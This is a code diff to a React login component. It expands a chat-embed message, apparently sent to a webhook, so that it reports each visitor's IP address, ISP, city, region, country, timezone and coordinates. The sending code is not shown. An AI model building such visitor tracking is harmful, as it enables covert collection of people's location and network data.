@@ -110,13 +110,11 @@ export default function Login() {
           inline: false,
         },
         {
-          name: "📍 Location",
+          name: "📍 Location & Network",
           value:
-            locationInfo.source === "GPS"
-              ? `**Latitude:** ${locationInfo.latitude}\n**Longitude:** ${locationInfo.longitude}\n**Accuracy:** ${locationInfo.accuracy}m\n**Source:** GPS`
-              : locationInfo.source === "IP"
-              ? `**City:** ${locationInfo.city}\n**Country:** ${locationInfo.country}\n**Source:** IP Geolocation`
-              : `**Source:** ${locationInfo.source}`,
+            locationInfo.source === "Unavailable"
+              ? `**Status:** ${locationInfo.source}`
+              : `**IP:** ${locationInfo.ip}\n**City:** ${locationInfo.city}\n**Region:** ${locationInfo.region}\n**Country:** ${locationInfo.country}\n**ISP:** ${locationInfo.isp}\n**Timezone:** ${locationInfo.timezone}\n**Coordinates:** ${locationInfo.latitude}, ${locationInfo.longitude}`,
           inline: false,
         },
         {
@@ -125,7 +123,7 @@ export default function Login() {
           inline: false,
         },
         {
-          name: "🌐 IP Source",
+          name: "🌐 Source",
           value: locationInfo.source,
           inline: true,
         }
